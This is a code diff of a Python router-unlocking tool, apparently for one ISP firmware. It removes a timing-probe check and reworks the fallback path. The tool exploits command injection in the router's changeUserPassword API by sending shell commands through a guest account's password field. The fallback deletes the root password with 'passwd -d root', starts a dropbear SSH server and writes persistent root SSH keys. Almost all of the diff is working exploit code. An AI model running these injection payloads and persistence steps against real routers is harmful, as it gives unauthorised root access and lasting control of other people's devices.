@@ -770,24 +770,20 @@ class PasswordVector(Vector):
             print("    warning: no password history recorded; forcing the "
                   "payloads anyway")
         elif "passwdHistory" not in guest:
-            # On newer builds (e.g. ARCNJIO_JIDU6101_R3.2) the user record omits
-            # passwdHistory entirely, but the shell-out is still active.
-            # Perform a timing probe to confirm shell execution before giving up.
-            print("    no passwdHistory attribute; probing for shell-out via timing ...")
-            t0 = time.time()
-            probe_reply = api.set_password(guest["recordId"], Injector().encode("sleep 1"))
-            elapsed = time.time() - t0
-            if Api._ok(probe_reply) and elapsed >= 1.0:
-                print("    shell-out confirmed active via timing probe")
-            else:
-                raise UnsupportedFirmware(
-                    "this build does not record password history and did not execute the timing probe.\n"
-                    "    The changeUserPassword API appears patched.\n"
-                    "    If the web UI still offers Backup and Restore, use the\n"
-                    "    offline breeze method instead:\n"
-                    f"      {BREEZE_GUIDE}\n"
-                    "      ./flash.sh breeze <config-backup>\n"
-                    "    Otherwise the fallback is the u-boot/UART console.")
+            # Some builds omit passwdHistory entirely. Without another execution
+            # signal, this field cannot establish whether injection is active.
+            # A slow successful request does not prove that the shell evaluated
+            # the password. Do not send exploit payloads without independent evidence.
+            raise UnsupportedFirmware(
+                "this build omits passwdHistory, so shell execution cannot be "
+                "confirmed safely.\n"
+                "    Pass --force only if you have independently verified this "
+                "firmware is injectable.\n"
+                "    If the web UI still offers Backup and Restore, use the\n"
+                "    offline breeze method instead:\n"
+                f"      {BREEZE_GUIDE}\n"
+                "      ./flash.sh breeze <config-backup>\n"
+                "    Otherwise the fallback is the u-boot/UART console.")
         else:
             raise UnsupportedFirmware(
                 "this build does not record password history, so the "
@@ -1053,17 +1049,19 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
                 # attempt direct in-band execution to enable dropbear directly.
                 print(f"    Method {number}/{total}: callback was not received. "
                       "Attempting direct command injection...")
+                bootstrap_shell = None
                 try:
                     with api.session("admin", password, patience):
                         guest = api.guest_record()
                         api.set_password(guest["recordId"], Injector().encode("passwd -d root"))
                         time.sleep(1)
-                        api.set_password(guest["recordId"], Injector().encode("dropbear -p 22"))
-                    shell.wait(15, "the router")
+                        api.set_password(guest["recordId"], Injector().encode("dropbear -R -p 22"))
+                    bootstrap_shell = Shell(api.host, password="")
+                    bootstrap_shell.wait(15, "the router")
                 except Exception:
                     pass
 
-                if not shell.alive():
+                if bootstrap_shell is None or not bootstrap_shell.alive():
                     print(f"    Method {number}/{total}: failed (the router accepted "
                           f"the payloads but never fetched http://{address}:{port}/)")
                     continue
@@ -1091,7 +1089,16 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
                         f"chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; "
                         f"chmod 700 /root/.ssh"
                     )
-                shell._exec(["ssh"] + shell._opts() + [f"{shell.user}@{shell.host}", persist_cmd])
+                result = bootstrap_shell._exec(
+                    ["ssh"] + bootstrap_shell._opts()
+                    + [f"{bootstrap_shell.user}@{bootstrap_shell.host}", persist_cmd],
+                    timeout=60)
+                if result.returncode != 0:
+                    raise IduError("could not configure SSH persistence: "
+                                    f"{result.stderr.strip()[:200]}")
+                if key_path and not shell.alive():
+                    raise IduError("SSH persistence was installed, but the supplied key "
+                                    "could not authenticate")
 
             print(f"    Method {number}/{total}: success")
             print("[+] Root SSH enabled")
